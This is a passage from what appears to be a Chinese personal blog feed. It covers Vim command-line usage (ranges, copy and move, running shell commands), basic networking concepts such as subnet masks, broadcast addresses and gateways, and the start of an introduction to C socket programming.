&#123;address&#125;</code> 命令的最后一个参数。</p><p>所以一下命令的含义就明确了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">:,.<span class="hljs-variable">$p</span>  <span class="hljs-comment"># 打印当前行到结尾</span><br>:%p    <span class="hljs-comment"># 打印整个文档</span><br></code></pre></td></tr></table></figure><h3 id="地址的偏移"><a href="#地址的偏移" class="headerlink" title="地址的偏移"></a>地址的偏移</h3><p>除开直接指定打印的范围之后，还可以对打印的范围进行偏移：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:.,.+3p  <span class="hljs-comment"># 打印当前行到当前行的第三行</span><br></code></pre></td></tr></table></figure><h2 id="复制命令-t-和移动命令-m"><a href="#复制命令-t-和移动命令-m" class="headerlink" title="复制命令 t 和移动命令 m"></a>复制命令 t 和移动命令 m</h2><p>复制命令的简称是<code>t</code>，但是全称是 <code>copy</code> 。这个命令的作用是复制指定范围的文本到寄存器中。<strong>为了更好地记忆，你可以把该命令想成“复制到（copy TO）”。</strong>其实这个命令的本意就是这样的。通过下面的例子可以知道。</p><p>移动命令全称是 <code>move</code> ，简称为 <code>m</code>。它的作用是移动指定范围的文本到另一个位置。</p><h3 id="复制命令"><a href="#复制命令" class="headerlink" title="复制命令"></a>复制命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">:6t.  <span class="hljs-comment"># 把第6行的内容复制到当前行的下一行</span><br>:t6.  <span class="hljs-comment"># 把当前行的内容复制到第6行的下一行</span><br>:t.    <span class="hljs-comment"># 把当前行的内容复制到下一行，这个命令相当于 yyp</span><br>:t$    <span class="hljs-comment"># 把当前行的内容复制到文件末尾</span><br>:`&lt;,`&gt;t0  <span class="hljs-comment"># 把选择区域的内容复制到文件开头</span><br></code></pre></td></tr></table></figure><p><code>:t.</code>命令会创建一个当前行副本，而另外一种做法则是用普通模式的复制和粘贴<br>命令（<code>yyp</code>）来达到同样的效果。这两种复制当前行的技术有个需要关注的差别：<code>yyp</code> 会使用寄存器，而 <code>:t.</code> 则不会。因此，当我不想覆盖默认寄存器中的当前内容时，有时我会使用 <code>:t.</code> 来复制行。</p><h3 id="移动命令"><a href="#移动命令" class="headerlink" title="移动命令"></a>移动命令</h3><p><code>:move</code> 命令看上去和 <code>:copy</code> 命令很相似：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:[range]move &#123;address&#125;<br></code></pre></td></tr></table></figure><p>上面这个就是移动命令支持的语法。</p><h3 id="重复命令"><a href="#重复命令" class="headerlink" title="重复命令"></a>重复命令</h3><h3 id="命令行窗口"><a href="#命令行窗口" class="headerlink" title="命令行窗口"></a>命令行窗口</h3><p>使用 <code>q:</code> 可以进入命令行窗口，这个窗口中有一些历史信息，同样的在命令行窗口中也可以使用 <code>Vim</code> 中的命令。按下<strong>回车</strong>可以执行命令</p><h3 id="运行-shell-命令"><a href="#运行-shell-命令" class="headerlink" title="运行 shell 命令"></a>运行 shell 命令</h3><p>在命令行模式中，输入 <code>:!</code> 然后输入 shell 命令，就可以运行 shell 命令。</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:!<span class="hljs-built_in">ls</span>  <span class="hljs-comment"># 列出当前目录下的文件</span><br></code></pre></td></tr></table></figure><p>注意区分 <code>:!ls</code> 和 <code>:ls</code> 的不同之处。前者调用的是 <code>shell</code> 中的 <code>ls</code>命令，而 <code>:ls</code>调用的是 <code>Vim</code> 的内置命令，用来显示缓冲区列表的内容。</p><p><strong>在 <code>Vim</code> 的命令行中，符号 <code>%</code> 代表当前文件名</strong>，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:gcc %  <span class="hljs-comment"># 编译当前文件并生成可执行文件</span><br></code></pre></td></tr></table></figure><p><code>:!&#123;cmd&#125;</code> 这种语法适用于执行一次性命令，但是如果想在 <code>shell</code> 中执行几条命令要怎么做？对这种情况，可以执行 <code>Vim</code> 的 <code>:shell</code> 命令来启动一个交互的 <code>shell</code> 会话。</p><p>把缓冲区内容作为标准输入或输出</p><p><code>:read !&#123;cmd&#125;</code> 命令让我们把命令的标准输出重定向到缓冲区。正如你所期望的<br>一样，<code>:write !&#123;cmd&#125;</code> 做相反的事。它把缓冲区内容作为指定 <code>&#123;cmd&#125;</code> 的标准输入</p><p>根据叹号在命令行上的位置不同，它的含义也不大相同。比较一下这些命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">:write! sh<br>:write ! sh<br>:write !sh<br></code></pre></td></tr></table></figure><p>上面三种写法中，只有<strong>第二种和第三种</strong>是<strong>一样的</strong>。其含义都是将缓冲区中的内容作为指定命令的标准输入。 </p><p><strong>但是，第一种写法的含义是：将当前的缓冲区数据强制写入到文件 <code>sh</code> 中</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404260217439.png"></p><p>转到具体的内容中去:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs txt">|usr_29.txt|用户手册中关于在程序的不同部分间移动的内容。<br>|usr_30.txt|用户手册中关于编辑程序的内容。<br>|C-indenting|输入时自动设置每行的缩进。<br>|=|重新缩进一些行。<br>|format-comments|对注释进行排版。<br><br>|:checkpath|显示所有被 (嵌套) 包含的文件。<br>|[i|在当前和被包含的文件中查找光标所在的的标识符。<br>|[_CTRL-I|跳到 &quot;[i&quot; 的匹配。<br>|[I|列出在当前和被包含的文件中匹配光标所在的标识符的行。<br>|[d|在当前和被包含的文件中查找光标所在的标识符的宏定义。<br><br>|CTRL-]|跳到光标所在的标签处 (例如: 函数的定义)。<br>|CTRL-T|跳回执行 CTRL-] 命令前的地方。<br>|:tselect|从一连串匹配的标签中选出一个。<br><br>|gd|跳到光标所在的局部变量的声明处。<br>|gD|跳到光标所在的全局变量的声明处。<br><br>|gf|跳到光标所在的文件名表示的文件。<br><br>|%|跳到匹配的 ()、&#123;&#125;、[]、/* */、#if、#else、#endif 处。<br>|[/|跳到上一个注释开始的位置。<br>|]/|跳到下一个注释结束的位置。<br>|[#|反向到未闭合的 #if、#ifdef 或 #else 处。<br>|]#|正向到未闭合的 #else 或 #endif 处。<br>|[(|反向到未闭合的 &#x27;(&#x27; 处。<br>|])|正向到未闭合的 &#x27;)&#x27; 处。<br>|[&#123;|反向到未闭合的 &#x27;&#123;&#x27; 处。<br>|]&#125;|正向到未闭合的 &#x27;&#125;&#x27; 处。<br><br>|v_ab|选中 &quot;一个块&quot; (&quot;a block&quot;)，从 &quot;[(&quot; 至 &quot;])&quot;，含括号<br>|v_ib|选中 &quot;内含块&quot; (&quot;inner block&quot;)，从 &quot;[(&quot; 至 &quot;])&quot;<br>|v_aB|选中 &quot;一个大块&quot; (&quot;a Block&quot;)，从 &quot;[&#123;&quot; 至 &quot;]&#125;&quot;，含括号<br>|v_iB|选中 &quot;内含大块&quot; (&quot;inner Block&quot;)，从 &quot;[&#123;&quot; 至 &quot;]&#125;&quot;<br></code></pre></td></tr></table></figure><h1 id="启动参数"><a href="#启动参数" class="headerlink" title="启动参数"></a>启动参数</h1><p>在使用命令 <code>Vim</code> 打开文件时，可以用一些参数来控制打开方式。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> [<span class="hljs-keyword">options</span>] ‑ 从标准输入读入文件<br><br><span class="hljs-keyword">vim</span> [<span class="hljs-keyword">options</span>] ‑t &#123;<span class="hljs-keyword">tag</span>&#125; 编辑与标签 &#123;<span class="hljs-keyword">tag</span>&#125; 关联的文件<br><br>‑g 启动 GUI (同时允许其他选项)<br><br>+[num] 置光标于第 [num] 行 (缺省: 末行)<br><br>+&#123;<span class="hljs-keyword">command</span>&#125; 载入文件后执行命令 &#123;<span class="hljs-keyword">command</span>&#125;<br><br>+/&#123;pat&#125; &#123;<span class="hljs-keyword">file</span>&#125; .. 置光标于首次出现 &#123;pat&#125; 处<br><br>-R 只读模式<br><br>-d 比较模式<br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://vim.nauxscript.com/vim/day-8.html#%E8%A1%8C%E5%86%85%E6%90%9C%E7%B4%A2">https://vim.nauxscript.com/vim/day-8.html#%E8%A1%8C%E5%86%85%E6%90%9C%E7%B4%A2</a></p><p><a href="https://yianwillis.github.io/vimcdoc/doc/usr_03.html#03.7">https://yianwillis.github.io/vimcdoc/doc/usr_03.html#03.7</a></p><p><a href="https://blog.csdn.net/shuangde800/article/details/11430659">窗口操作</a></p><p><a href="https://yyq123.blogspot.com/">https://yyq123.blogspot.com/</a></p><p><a href="https://blog.easwy.com/archives/advanced-vim-skills-netrw-bufexplorer-winmanager-plugin/">vim使用技巧作者博客</a></p><p><a href="https://haicoder.net/vim/vim-edit-page-downup.html">大量快捷键操作</a></p><p><a href="https://tszv.vercel.app/pages/7e38ab/#ctrl-t">在不同的软件中使用vim模式的教程</a></p><p><a href="https://vim.nauxscript.com/vim/day-11.html#%E4%BD%95%E4%B8%BA%E8%B7%B3%E8%BD%AC%EF%BC%88jump%EF%BC%89">和上面一致</a></p><p><a href="http://www.uinio.com/Linux/Vim/#%E5%AE%8F%E5%BD%95%E5%88%B6">http://www.uinio.com/Linux/Vim/#%E5%AE%8F%E5%BD%95%E5%88%B6</a></p><ul><li><a href="https://blog.itpub.net/8225414/viewspace-944533/">Vim快捷键</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>vim</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络基础</title>
    <link href="/2023/11/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/11/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>总结学习计算机网络的知识点</p><span id="more"></span><h1 id="网络中的分层"><a href="#网络中的分层" class="headerlink" title="网络中的分层"></a>网络中的分层</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311282046418.png"></p><h1 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h1><blockquote><p>IP地址是 Internet Protocol Address 的缩写，译为“网际协议地址”。</p></blockquote><p>一台计算机可以拥有一个独立的 IP 地址，一个局域网也可以拥有一个独立的 IP 地址（对外就好像只有一台计算机）。对于目前广泛使用 IPv4 地址，它的资源是非常有限的，一台计算机一个 IP 地址是不现实的，往往是一个局域网才拥有一个 IP 地址。</p><h2 id="ABC类地址的划分"><a href="#ABC类地址的划分" class="headerlink" title="ABC类地址的划分"></a>ABC类地址的划分</h2><p>划分只是为了较为规范化的管理，就像软件框架一样进行约定，负责的功能模块及条理也清晰了许多；但这类规范并不是强制性要求，只是有效合理的划分可以节省更多的ip资源，也可缓解IP地址紧缺（资源不够用）。</p><ul><li>A类保留政府机构</li><li>B类分配给中等规模公司</li><li>C类分配给需要的任何人</li><li>D类地址用于网管专业配置地址</li><li>E类地址用于研发人员的科研实验</li><li>D、E类IP普及受众范围小，普众的实际使用率低，因此非重点述说。</li></ul><p>私有地址属于非注册地址，专门为组织机构内部使用（局域网）。以下列出留用的内部私有地址：</p><ul><li>A类 10.0.0.0–10.255.255.255</li><li>B类 172.16.0.0–172.31.255.255</li><li>C类 192.168.0.0–192.168.255.255</li></ul><h1 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h1><blockquote><p>MAC 地址是 Media Access Control Address 的缩写，直译为“媒体访问控制地址”，也称为局域网地址（LAN Address），以太网地址（Ethernet Address）或物理地址（Physical Address）。</p></blockquote><p>但是只是知道ip地址，也就是只知道一个大概的地理地址范围，所以引入了<code>MAC</code>地址，<code>MAC</code>是所有计算机网卡中的一个唯一值，世界上所有的计算机中<code>MAC</code>的值都是不同的。其在网卡出场时就已经被写入了网卡中了。</p><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><p>由于一台计算机会提供各种各样的网络服务。所以，如果我们仅仅找到了计算机的地理位置，但是还是不可以与其进行通信，这是因为服务器不知道应该将数据发送给这台计算机中的哪一个程序处理。这是就需要通过指定<strong>端口号</strong>，不同的端口号对应着不同的网络服务程序。如：Web 服务的端口号是 80，FTP 服务的端口号是 21，SMTP 服务的端口号是 25。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311282322751.png"></p><h1 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h1><p>子网掩码（Subnet Mask）在计算机网络中起着至关重要的作用，特别是在IP地址的分配和管理中。子网掩码的主要作用是定义IP地址中哪些部分标识网络（网络地址），哪些部分标识主机（主机地址）。</p><p>在IPv4地址中，一个地址由32位组成，通常表示为四个十进制数，每个数代表8位（一个字节），用点分隔，例如192.168.1.100。子网掩码也是一个32位的二进制数，通常也表示为点分十进制形式，例如255.255.255.0。</p><h2 id="网络地址"><a href="#网络地址" class="headerlink" title="网络地址"></a>网络地址</h2><p><strong>网络地址是识别网络ID用的 ，如192.168.1.0 ，说明该网段属于192.168.1的段 ，属于不可用IP；</strong></p><p><strong>子网掩码通过与IP地址进行逻辑“与”（AND）操作，来确定IP地址中的网络部分和主机部分。</strong>在二进制表示中，子网掩码通常是一系列的1后跟一系列的0，1表示对应的IP地址位是网络部分，0表示对应的是主机部分。</p><p>例如，如果有一个IP地址192.168.1.100和子网掩码255.255.255.0，它们的二进制表示如下：</p><p>IP地址: 192.168.1.100<br>11000000.10101000.00000001.01100100</p><p>子网掩码: 255.255.255.0<br>11111111.11111111.11111111.00000000</p><p>将IP地址与子网掩码进行逻辑“与”操作，得到网络地址：</p><p>网络地址: 192.168.1.0<br>11000000.10101000.00000001.00000000</p><p>在这个例子中，子网掩码255.255.255.0表示前三个字节（24位）是网络地址，最后一个字节（8位）是主机地址。</p><h2 id="广播地址"><a href="#广播地址" class="headerlink" title="广播地址"></a>广播地址</h2><p><strong>用于进行广播的通用地址 ，如192.168.1.255。PC在询问网关时，把信息发往192.168.1.255，于是192.168.1.1-192.168.1.254的所有机器都可以接收到它发来的信息，信息会问谁是网关你的MAC地址是多少，如果有一台机器是网关他就会回应。</strong></p><p>如果要向同一个网络中的所有设备发送数据，则需要使用广播地址。广播地址是一个特殊的IP地址，它使得所有同一子网中的计算机都能够接收到数据。</p><p>在IPv4网络中，广播地址通常是网络地址范围内最后一个可用的IP地址。要计算广播地址，你需要知道网络的IP地址和子网掩码。</p><p>以下是计算广播地址的步骤：</p><ol><li>将IP地址转换为二进制格式。</li><li>将子网掩码转换为二进制格式。</li><li>对IP地址和子网掩码进行逻辑“与”（AND）操作，得到网络地址。</li><li>对子网掩码取反（将所有1变成0，所有0变成1），得到反向掩码（也称为广播掩码）。</li><li>将网络地址和反向掩码进行逻辑“或”（OR）操作，得到广播地址。</li></ol><p><strong>公式：网络地址 || (~子网掩码) &#x3D; 广播地址</strong></p><p>例如，假设有一个IP地址为192.168.1.100，子网掩码为255.255.255.0，我们来计算其广播地址：</p><p>IP地址的二进制表示：</p><pre><code class="hljs">    192.168.1.100 = 11000000.10101000.00000001.01100100</code></pre><p>子网掩码的二进制表示：</p><pre><code class="hljs">    255.255.255.0 = 11111111.11111111.11111111.00000000</code></pre><p>计算网络地址（IP地址 AND 子网掩码）：</p><pre><code class="hljs">    11000000.10101000.00000001.01100100 AND    11111111.11111111.11111111.00000000 =    11000000.10101000.00000001.00000000 = 192.168.1.0</code></pre><p>计算反向掩码（NOT 子网掩码）：</p><pre><code class="hljs">    NOT 11111111.11111111.11111111.00000000 =    00000000.00000000.00000000.11111111 = 0.0.0.255</code></pre><p>计算广播地址（网络地址 OR 反向掩码）：</p><pre><code class="hljs">    11000000.10101000.00000001.00000000 OR    00000000.00000000.00000000.11111111 =    11000000.10101000.00000001.11111111 = 192.168.1.255</code></pre><p>所以，在这个例子中，广播地址是192.168.1.255。</p><p>快速运算：</p><p><strong>子网掩码 &#x2F;26，32-26&#x3D;6（子网掩码未遮罩的6个0为h，h为主机编号位，26-2即最大可用主机数；也由此可推出广播地址为 x.x.x.最大可用主机数+1</strong></p><p>在实际应用中，你通常不需要手动进行这些转换和计算，因为大多数网络设备和操作系统都可以自动处理这些操作。但是，了解这个过程有助于你更好地理解网络地址和子网划分的工作原理。</p><h1 id="子网掩码ABC类IP地址最大网络范围与最大可用主机数"><a href="#子网掩码ABC类IP地址最大网络范围与最大可用主机数" class="headerlink" title="子网掩码ABC类IP地址最大网络范围与最大可用主机数"></a>子网掩码ABC类IP地址最大网络范围与最大可用主机数</h1><p>IP地址分为两部分，左边部分用来标识主机所在的网络，被称为网络地址，右边被用来标识主机本身，称为主机地址；可左右部分各字节占总比的 ?&#x2F;4 并不知道，也由此，地址的类别开始进行划分开来。</p><table><thead><tr><th>IP地址类型</th><th>地址表示范围</th><th>缺省（默认）子网掩码</th><th>网络位n与主机位h</th></tr></thead><tbody><tr><td>A类地址</td><td>1.0.0.1-127.255.255.255</td><td>255.0.0.0</td><td>0nnnnnnn.hhhhhhhh.hhhhhhhh.hhhhhhhh</td></tr><tr><td>B类地址</td><td>128.0.0.1-191.255.255.255</td><td>255.255.0.0</td><td>10nnnnnn.nnnnnnnn.hhhhhhhh.hhhhhhhh</td></tr><tr><td>C类地址</td><td>192.0.0.1-223.255.255.255</td><td>255.255.255.0</td><td>110nnnnn.nnnnnnnn.nnnnnnnn.hhhhhhhh</td></tr></tbody></table><h1 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h1><p>相同网段的ip，但不同子网掩码，也是可以连接的；但，这取决于被子网划分的最大可用主机数的多数主机中相比的最小值。所以这就出现了<strong>网关</strong></p><p>网关（Gateway）又称网间连接器，就是一个网络连接到另一个网络的“关口”。</p><p>网关实质上是一个网络通向其他网络的IP地址。比如有网络A和网络B，网络A的IP地址范围为“192.168.1.1<del>192. 168.1.254”，子网掩码为255.255.255.0；网络B的IP地址范围为“192.168.2.1</del>192.168.2.254”，子网掩码为255.255.255.0。在没有路由器的情况下，两个网络之间是不能进行TCP&#x2F;IP通信的，即使是两个网络连接在同一台交换机(或集线器)上，TCP&#x2F;IP协议也会根据子网掩码(255.255.255.0)判定两个网络中的主机处在不同的网络里。而要实现这两个网络之间的通信，则必须通过网关。如果网络A中的主机发现数据包的目的主机不在本地网络中，就把数据包转发给它自己的网关，再由网关转发给网络B的网关，网络B的网关再转发给网络B的某个主机(如附图所示)。网络B向网络A转发数据包的过程。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405251652135.png"></p><p>所以说，只有设置好网关的IP地址，TCP&#x2F;IP协议才能实现不同网络之间的相互通信。那么这个IP地址是哪台机器的IP地址呢？网关的IP地址是具有路由功能的设备的IP地址，具有路由功能的设备有路由器、启用了路由协议的服务器(实质上相当于一台路由器)、代理服务器(也相当于一台路由器)。</p><h2 id="指定网关"><a href="#指定网关" class="headerlink" title="指定网关"></a>指定网关</h2><p>前面我们知道，所谓的网关其实就是一个 IP 地址，它是用来连接两个网络的，所以我们需要在路由器上配置好网关的 IP 地址。</p><p>如何让PC1:192.168.1.3&#x2F;26、PC2:192.168.1.70&#x2F;26，两台不同网络地址的PC进行通信？</p><p>答：配置各自PC的网关，并向路由器添加各自的网关地址，即可使两台PC进行信息传递</p><p>一台电脑的默认网关是不可以随随便便指定的，必须正确指定，否则一台电脑就会将数据包发给不是网关的电脑，从而无法与其他网络的电脑通信。</p><p>正确指定的前提： 根据主机已有IP地址类型的当前具体的网段所容纳的可用最大主机数范围，进行的一个IP的设定。</p><ol><li><p>算出当前主机网络最大可用容纳范围主机数</p><p> 公式：2^h-2 &#x3D; 最大可用主机数</p><p> 2*（32-26）-2 &#x3D; 62 (去掉网络地址 192.168.1.0和广播地址 192.168.1.63)</p></li><li><p>求出当前主机IP的所在子网划分范围</p></li></ol><p>当前IP地址的子网划分范围也就是当前网关设置的范围</p><table><thead><tr><th>网络地址</th><th>子网掩码</th><th>子网划分范围</th><th>广播地址</th></tr></thead><tbody><tr><td>192.168.1.0</td><td>255.255.255.192</td><td>1~62</td><td>192.168.1.63</td></tr><tr><td>192.168.1.64</td><td>255.255.255.192</td><td>65~126</td><td>192.168.1.127</td></tr><tr><td>192.168.1.128</td><td>255.255.255.192</td><td>129~190</td><td>192.168.1.191</td></tr><tr><td>192.168.1.192</td><td>255.255.255.192</td><td>193~254</td><td>192.168.1.255</td></tr></tbody></table><p>由上表可得出公式：</p><ul><li>子网划分从第二网段开始的网络地址&#x3D;广播地址+1</li><li>子网划分从第二网段开始的可容纳主机范围最小值&#x3D;广播地址+1</li><li>num：子网划分可容纳主机范围最小值<ul><li>num+(2^h-2)-1 &#x3D; 子网划分可容纳主机数范围最大值</li></ul></li><li>广播地址 &#x3D; 子网划分可容纳主机数范围最大值+1</li></ul><p>最后配置各自PC的网关，并向路由器添加各自的网关地址</p><p>最后在设置 网关地址 的时候，只要该网关在该网络的范围中即可。<br>例如，上面例子的网关可以设置为：</p><ul><li>PC1的网关地址为192.168.1.60</li><li>PC2的网关地址为192.168.1.126</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405251717236.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.runoob.com/w3cnote/summary-of-network.html">https://www.runoob.com/w3cnote/summary-of-network.html</a></li><li><a href="https://blog.csdn.net/w8y56f/article/details/120920921">https://blog.csdn.net/w8y56f/article/details/120920921</a></li><li><a href="https://help.aliyun.com/zh/ecs/user-guide/network-faq?utm_content=g_1000230851&spm=5176.20966629.toubu.3.f2991ddcpxxvD1#title-gu4-uzk-12r">https://help.aliyun.com/zh/ecs/user-guide/network-faq?utm_content=g_1000230851&amp;spm=5176.20966629.toubu.3.f2991ddcpxxvD1#title-gu4-uzk-12r</a></li><li><a href="https://hoochanlon.github.io/helpdesk-guide/enhance/net/neta.html#%E6%8C%87%E5%AE%9A%E7%BD%91%E5%85%B3%E7%9A%84%E8%AE%BE%E8%AE%A1">https://hoochanlon.github.io/helpdesk-guide/enhance/net/neta.html#%E6%8C%87%E5%AE%9A%E7%BD%91%E5%85%B3%E7%9A%84%E8%AE%BE%E8%AE%A1</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>socket学习1</title>
    <link href="/2023/11/28/socket%E5%AD%A6%E4%B9%A01/"/>
    <url>/2023/11/28/socket%E5%AD%A6%E4%B9%A01/</url>
    
    <content type="html"><![CDATA[<p>总结学习socket的知识点</p><span id="more"></span><h1 id="什么是Socket"><a href="#什么是Socket" class="headerlink" title="什么是Socket"></a>什么是Socket</h1><p>socket 的原意是“插座”，在计算机通信领域，socket 被翻译为“套接字”，它是计算机之间进行通信的<strong>一种约定或一种方式</strong>。通过 socket 这种约定，一台计算机可以接收其他计算机的数据，也可以向其他计算机发送数据。</p><p>首先我们知道在Linux中一切皆是文件个概念，所以网络连接也是文件，其和普通的文件一样也有文件描述符。</p><p>我们可以通过 socket() 函数来创建一个网络连接，或者说打开一个网络文件，socket() 的返回值就是文件描述符。有了文件描述符，我们就可以使用普通的文件操作函数来传输数据了，例如：</p><ul><li>用 read() 读取从远程计算机传来的数据；</li><li>用 write() 向远程计算机写入数据。</li></ul><h1 id="Socket的种类"><a href="#Socket的种类" class="headerlink" title="Socket的种类"></a>Socket的种类</h1><p>Socket有许多种类包括：DARPA Internet 地址（Internet 套接字）、本地节点的路径名（Unix套接字）、CCITT X.25地址（X.25 套接字）</p><h1 id="Internet套接字"><a href="#Internet套接字" class="headerlink" title="Internet套接字"></a>Internet套接字</h1><h2 id="主要的传输方式"><a href="#主要的传输方式" class="headerlink" title="主要的传输方式"></a>主要的传输方式</h2><p><a href="https://c.biancheng.net/view/2124.html">https://c.biancheng.net/view/2124.html</a></p><p>流格式套接字：SOCK_STREAM 是一种<strong>可靠的、双向的</strong>通信数据流，数据可以准确无误地到达另一台计算机，如果损坏或丢失，可以重新发送。</p><p>数据报套接字：数据报格式套接字（Datagram Sockets）也叫“无连接的套接字”，在代码中使用 SOCK_DGRAM 表示。<br>计算机只管传输数据，不作数据校验，如果数据在传输中损坏，或者没有到达另一台计算机，是没有办法补救的。也就是说，数据错了就错了，无法重传。</p><h3 id="流格式套接字的特点："><a href="#流格式套接字的特点：" class="headerlink" title="流格式套接字的特点："></a>流格式套接字的特点：</h3><ol><li>发送、接受不是同步的</li><li>具有自我修复功能</li><li>按照顺序传输</li></ol><p>这个流格式套接字就像传送带一样。</p><h1 id="Socket编程中的常用函数"><a href="#Socket编程中的常用函数" class="headerlink" title="Socket编程中的常用函数"></a>Socket编程中的常用函数</h1><p>Socket中常用函数之间的关系<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311282233869.png"></p><h2 id="Socket"><a href="#Socket" class="headerlink" title="Socket()"></a>Socket()</h2><p>这个函数用来创建一个套接字，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol)</span>;<br><span class="hljs-comment">//参数：</span><br>    <span class="hljs-comment">//af：表示IP地址类型： 常用的有 AF_INET 和 AF_INET6。AF表示address family地址族 PF表示Protocol协议族。其实这两个是一致的。</span><br><br>    <span class="hljs-comment">//type：表示数据传输方式：常用的有 SOCK_STREAM（流格式套接字/面向连接的套接字） 和 SOCK_DGRAM（数据报套接字/无连接的套接字）</span><br><br>    <span class="hljs-comment">//protocol：表示传输协议，当使用TCP时，IPPROTO_TCP；使用UDP时，IPPROTO_UDP</span><br><br><span class="hljs-comment">//返回值：创建的套接字的文件描述符</span><br><br><span class="hljs-type">int</span> tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);  <span class="hljs-comment">//IPPROTO_TCP表示TCP协议</span><br><br><span class="hljs-type">int</span> udp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);  <span class="hljs-comment">//IPPROTO_UDP表示UDP协议</span><br><br><span class="hljs-comment">//上面两种情况都只有一种协议满足条件，可以将 protocol 的值设为 0，系统会自动推演出应该使用什么协议，如下所示：</span><br><span class="hljs-type">int</span> tcp_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);  <span class="hljs-comment">//创建TCP套接字</span><br><span class="hljs-type">int</span> udp_socket = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);  <span class="hljs-comment">//创建UDP套接字</span><br></code></pre></td></tr></table></figure><p>为什么需要第三个参数：一般情况下有了 af 和 type 两个参数就可以创建套接字了，操作系统会自动推演出协议类型，除非遇到这样的情况：<strong>有两种不同的协议支持同一种地址类型和数据传输类型</strong>。如果我们不指明使用哪种协议，操作系统是没办法自动推演的。</p><p><a href="https://c.biancheng.net/view/2344.html">https://c.biancheng.net/view/2344.html</a></p><h2 id="bind-函数和connect-函数"><a href="#bind-函数和connect-函数" class="headerlink" title="bind()函数和connect()函数"></a>bind()函数和connect()函数</h2><h3 id="bind"><a href="#bind" class="headerlink" title="bind()"></a>bind()</h3><p>这个函数用来将Socket和相应的ip地址、接口绑定起来。</p><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 